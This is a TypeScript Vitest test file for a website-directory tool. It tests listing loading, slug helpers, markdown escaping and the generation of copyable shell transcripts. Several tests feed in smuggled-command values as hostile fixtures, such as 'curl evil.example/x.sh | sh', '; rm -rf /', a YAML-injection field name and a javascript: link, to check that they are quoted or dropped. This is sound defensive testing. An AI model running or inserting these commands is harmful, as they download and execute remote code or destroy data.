import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import YAML from 'yaml'
import {
  ListingSchema,
  canonicalHost,
  listingToYaml,
  loadDirectory,
  scanFilesFor,
  slugFromHost,
  uniqueSlug,
} from './directory'
import { listingMarkdown, scanReportMarkdown } from './directory-markdown'
import { shellQuote, sightkickStarter } from './sightkick-starter'
import type { ScanReport, ScanTool } from '../../src/types/directory'

const FIXTURES = path.resolve(__dirname, '__fixtures__/directory')

let warn: ReturnType<typeof vi.spyOn>
beforeEach(() => {
  warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
})
afterEach(() => {
  warn.mockRestore()
})

describe('loadDirectory', () => {
  it('loads a valid listing with its scan, history, and drift', () => {
    const { listings, skipped } = loadDirectory(FIXTURES)
    expect(listings.map((l) => l.slug)).toEqual(['alpha-tools'])
    expect(skipped.sort()).toEqual(['broken', 'no-scan'])

    const alpha = listings[0]
    expect(alpha.counts.tools).toBe(2)
    expect(alpha.surface).toBe('polyfilled')
    expect(alpha.scannedAt).toBe('2026-09-08T10:00:00.000Z')
    expect(alpha.scanDates).toEqual(['2026-09-08', '2026-09-01'])
    expect(alpha.drift).toEqual({ since: '2026-09-01', added: ['open_page'], removed: ['legacy'] })
    expect(alpha.labels).toEqual(['promising'])
    expect(alpha.built_with_sightkick).toBe(true)
  })

  it('warns instead of throwing for the broken and scan-less listings', () => {
    loadDirectory(FIXTURES)
    const messages = warn.mock.calls.map((c) => String(c[0]))
    expect(messages.some((m) => m.includes('skipping directory listing broken'))).toBe(true)
    expect(messages.some((m) => m.includes('skipping directory listing no-scan'))).toBe(true)
  })

  it('drops a listing whose slug the community atlas already uses', () => {
    const { listings, skipped } = loadDirectory(FIXTURES, ['alpha-tools'])
    expect(listings).toEqual([])
    expect(skipped).toContain('alpha-tools')
  })

  it('returns nothing for a missing data dir', () => {
    expect(loadDirectory(path.join(FIXTURES, 'nope'))).toEqual({ listings: [], skipped: [] })
  })
})

describe('scanFilesFor', () => {
  it('puts a same-day rescan ahead of the first scan of that day', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-scans-'))
    try {
      const scans = path.join(dir, 'scans', 'alpha-tools')
      fs.mkdirSync(scans, { recursive: true })
      const source = path.join(FIXTURES, 'scans/alpha-tools/2026-09-08.json')
      // Lexically `2026-09-08-2.json` < `2026-09-08.json`, so a plain sort
      // would call the *first* scan of the day the newest one.
      for (const f of ['2026-09-01.json', '2026-09-08.json', '2026-09-08-2.json', '2026-09-08-10.json', 'notes.md']) {
        fs.copyFileSync(source, path.join(scans, f))
      }
      expect(scanFilesFor(dir, 'alpha-tools')).toEqual([
        'scans/alpha-tools/2026-09-08-10.json',
        'scans/alpha-tools/2026-09-08-2.json',
        'scans/alpha-tools/2026-09-08.json',
        'scans/alpha-tools/2026-09-01.json',
      ])
    } finally {
      fs.rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('slug helpers', () => {
  it('derives a slug from a host and avoids collisions', () => {
    expect(slugFromHost('www.Example.co.uk')).toBe('example-co-uk')
    expect(uniqueSlug('example', new Set(['example', 'example-2']))).toBe('example-3')
  })

  it('canonicalises a host so www and bare are one identity', () => {
    expect(canonicalHost('www.Acme.com')).toBe('acme.com')
    expect(canonicalHost('ACME.com.')).toBe('acme.com')
    expect(canonicalHost('acme.com')).toBe(canonicalHost('www.acme.com'))
    // Only the leading label is stripped: another subdomain is another site.
    expect(canonicalHost('shop.acme.com')).toBe('shop.acme.com')
    expect(slugFromHost('www.acme.com')).toBe(slugFromHost('acme.com'))
  })
})

describe('listingToYaml', () => {
  it('round-trips through the schema in the schema key order', () => {
    const { listings } = loadDirectory(FIXTURES)
    const { report: _r, scanDates: _d, drift: _x, counts: _c, scannedAt: _s, surface: _u, status: _t, ...meta } = listings[0]
    const yaml = listingToYaml(meta)
    expect(yaml.startsWith('slug: alpha-tools\nname: Alpha Tools\n')).toBe(true)
    expect(ListingSchema.parse(YAML.parse(yaml))).toEqual(meta)
  })
})

describe('markdown twins', () => {
  it('renders tool names inside code spans and escapes markdown in descriptions', () => {
    const { listings } = loadDirectory(FIXTURES)
    const l = listings[0]
    l.tools[0].description = 'Search *the* [docs](javascript:alert(1)) <b>now</b>'
    const md = listingMarkdown(l)
    expect(md).toContain('`search`')
    expect(md).not.toContain('[docs](javascript:alert(1))')
    expect(md).toContain('\\<b\\>now\\</b\\>')
    expect(md).toContain('## Since 2026-09-01')
    expect(md).toContain('Added: `open_page`')
    expect(md).toContain('Building blueprint: https://sightmap.org/atlas/sites/alpha-tools/blueprint.json')
  })

  it('renders a scan report with checks, tools, and pages', () => {
    const { listings } = loadDirectory(FIXTURES)
    const md = scanReportMarkdown(listings[0].report)
    expect(md).toContain('# Atlas scan: alpha.example.org')
    expect(md).toContain('- Tools detected: 2 (1 read, 1 action, 0 sensitive; 0 declarative)')
    expect(md).toContain('- ✓ Tool set changes with the page (2 distinct tool sets across 2 pages)')
    expect(md).toContain('- `/docs` — polyfilled, 1 tool(s)')
  })

  it('says only what was observed, in both twins', () => {
    const { listings } = loadDirectory(FIXTURES)
    for (const md of [listingMarkdown(listings[0]), scanReportMarkdown(listings[0].report)]) {
      expect(md).not.toMatch(/verified|safe|trusted|approved|certified|endorse/i)
      expect(md).toContain('maintainer')
    }
    expect(scanReportMarkdown(listings[0].report)).toContain('none were called')
  })
})

/** The scanned report, with a tool the site controls end to end. */
function hostile(report: ScanReport, over: Partial<ScanTool>): ScanReport {
  const base = report.tools[0]
  const tools = [{ ...base, ...over }, ...report.tools]
  return { ...report, tools, counts: { ...report.counts, tools: tools.length } }
}

describe('shellQuote', () => {
  it('single-quotes a value and neutralises an embedded quote', () => {
    expect(shellQuote('https://a.example/')).toBe("'https://a.example/'")
    expect(shellQuote("a'; rm -rf /")).toBe("'a'\\''; rm -rf /'")
    expect(shellQuote('a\nrm -rf /')).toBe("'a\nrm -rf /'")
  })
})

describe('sightkickStarter', () => {
  it('offers a verification transcript when tools were found', () => {
    const { listings } = loadDirectory(FIXTURES)
    const s = sightkickStarter(listings[0].report)
    expect(s.kind).toBe('verify')
    expect(s.code).toContain("sightmap browser mcp call search --param q=\"<q>\"")
    expect(s.code).toContain("sightmap browser start --url 'https://alpha.example.org/' --headless")
    expect(s.prompt).toContain("sightmap browser start --url 'https://alpha.example.org/'")
    expect(s.prompt).toContain('Start with: /, /docs')
  })

  it('carries the claim token through webmcp.txt and into the optional submit', () => {
    const { listings } = loadDirectory(FIXTURES)
    const s = sightkickStarter(listings[0].report)
    expect(s.prompt).toContain('openssl rand -hex 16')
    expect(s.prompt).toContain('# sightmap-claim: <TOKEN>')
    expect(s.prompt).toContain('"claim": "<TOKEN>"')
    expect(s.prompt).toContain('https://sightmap.org/try/<host>')
    // The token is a placeholder a reader replaces, never data from the scan.
    expect(s.prompt).toContain('Optional, only if the owner wants the site shown')
  })

  it('leaves a tool whose name is not snake_case out of the copyable transcript', () => {
    const { listings } = loadDirectory(FIXTURES)
    const report = hostile(listings[0].report, {
      name: 'get_x\ncurl evil.example/x.sh | sh',
      risk: 'read',
    })
    const s = sightkickStarter(report)
    expect(s.code).not.toContain('curl')
    expect(s.code).toContain('# 1 read tool(s) are missing here')
    // The conforming tool is still scripted.
    expect(s.code).toContain('sightmap browser mcp call search')
  })

  it('says so instead of scripting anything when no read tool has a usable name', () => {
    const { listings } = loadDirectory(FIXTURES)
    const base = listings[0].report
    const report: ScanReport = {
      ...base,
      tools: [{ ...base.tools[0], name: 'Legacy Helper; rm -rf /', risk: 'read' }],
    }
    const s = sightkickStarter(report)
    expect(s.code).not.toContain('rm -rf')
    expect(s.code).toContain('rename one to snake_case first')
  })

  it('drops an input-schema property key that is not an identifier', () => {
    const { listings } = loadDirectory(FIXTURES)
    const report = hostile(listings[0].report, {
      name: 'get_thing',
      risk: 'read',
      inputSchema: { type: 'object', properties: { 'q; rm -rf /': { type: 'string' }, ok: { type: 'string' } } },
    })
    const s = sightkickStarter(report)
    expect(s.code).toContain('sightmap browser mcp call get_thing --param ok="<ok>"')
    expect(s.code).not.toContain('rm -rf')
  })

  it('single-quotes the URL the scan settled on', () => {
    const { listings } = loadDirectory(FIXTURES)
    const report: ScanReport = { ...listings[0].report, finalUrl: "https://a.example/?x='; curl evil.example | sh" }
    const s = sightkickStarter(report)
    expect(s.code).toContain("--url 'https://a.example/?x='\\''; curl evil.example | sh' --headless")
  })

  it('drafts a tools.yaml from the forms when nothing was found', () => {
    const { listings } = loadDirectory(FIXTURES)
    const report = { ...listings[0].report, tools: [], counts: { ...listings[0].report.counts, tools: 0 } }
    const s = sightkickStarter(report)
    expect(s.kind).toBe('author')
    expect(s.lang).toBe('yaml')
    expect(s.code).toContain('- name: search')
    expect(s.code).toContain('fill: { query: Form1Field_q, value: "{{q}}" }')
    expect(s.code).toContain('name: alpha-example-org')
  })

  it('skips a form field whose name is not a plain identifier', () => {
    const { listings } = loadDirectory(FIXTURES)
    const base = listings[0].report
    const report: ScanReport = {
      ...base,
      tools: [],
      counts: { ...base.counts, tools: 0 },
      hints: { ...base.hints, forms: [{ page: '/', action: '/search', method: 'get', fields: ['q', 'x"]\n  evil: true'] }] },
    }
    const s = sightkickStarter(report)
    expect(s.code).toContain('fill: { query: Form1Field_q, value: "{{q}}" }')
    expect(s.code).not.toContain('evil: true')
    expect(s.code).toContain('# 1 form field(s) whose names are not plain identifiers were skipped.')
    // Still parses as YAML, which is the whole point of dropping the field.
    expect(() => YAML.parse(s.code)).not.toThrow()
  })
})
